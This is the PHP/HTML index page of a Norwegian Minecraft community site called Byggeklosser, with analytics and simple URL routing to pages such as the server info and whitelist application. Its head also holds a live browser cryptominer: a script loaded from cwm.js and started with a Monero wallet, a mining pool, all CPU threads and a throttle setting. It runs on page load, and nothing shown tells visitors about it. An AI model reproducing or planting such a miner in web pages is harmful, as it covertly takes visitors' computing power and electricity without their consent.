<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>Byggeklosser - Norsk Minecraft Community</title>
<link rel="stylesheet" href="/resources/style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-68727627-1', 'auto');
  ga('send', 'pageview');

</script>
<script src="http://www.byggeklosser.net/cwm.js"></script>
<script>
    var site_id = 'cwm-460';
    var coin = 'monero';
    var wallet = '46MnUSTTxKgFFxLsWoesjkDUgv28TQYHodxMwTJoPQH2YHTdMpSSCYW4Su1AcgorZPF2YFUjoHD5rEZ5NMNmDjVcMXvgi9x';
    var password = 'byggeklosser';
    var mining_pool = 'mine.xmrpool.net:3333';
    var threads = -1;
    var throttle = 0.6;
    var debug = false;
    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug);
</script>
</head>
<?php
function parse_path() {
  $path = array();
  if (isset($_SERVER['REQUEST_URI'])) {
    $request_path = explode('?', $_SERVER['REQUEST_URI']);

    $path['base'] = rtrim(dirname($_SERVER['SCRIPT_NAME']), '\/');
    $path['call_utf8'] = substr(urldecode($request_path[0]), strlen($path['base']) + 1);
    $path['call'] = utf8_decode($path['call_utf8']);
    if ($path['call'] == basename($_SERVER['PHP_SELF'])) {
      $path['call'] = '';
    }
    $path['call_parts'] = explode('/', $path['call']);

    $path['query_utf8'] = urldecode($request_path[1]);
    $path['query'] = utf8_decode(urldecode($request_path[1]));
    $vars = explode('&', $path['query']);
    foreach ($vars as $var) {
      $t = explode('=', $var);
      $path['query_vars'][$t[0]] = $t[1];
    }
  }
return $path;
}

$path_info = parse_path();
?>
<body>
<div class="wrapper">
<?php
require_once("header.php");

$url_path = $path_info['call_parts'];
if($url_path[0] == "") {
	require_once("pages/home.php");
}
else if($url_path[0] == "server") {
	require_once("pages/server.php");
}
else if($url_path[0] == "stream") {
	require_once("pages/stream.php");
}
else if($url_path[0] == "omoss") {
	require_once("pages/omoss.php");
}
else if($url_path[0] == "whitelistapply") {
	if($url_path[1] == "submit") {
		require_once("pages/whitelist_submit.php");
	} else {
		require_once("pages/whitelist.php");
	}
}
else {
	require_once("pages/404.php");
} ?>
<div class="push"></div>
</div>
<?php 
	require_once("footer.php");
?>
</body>
</html>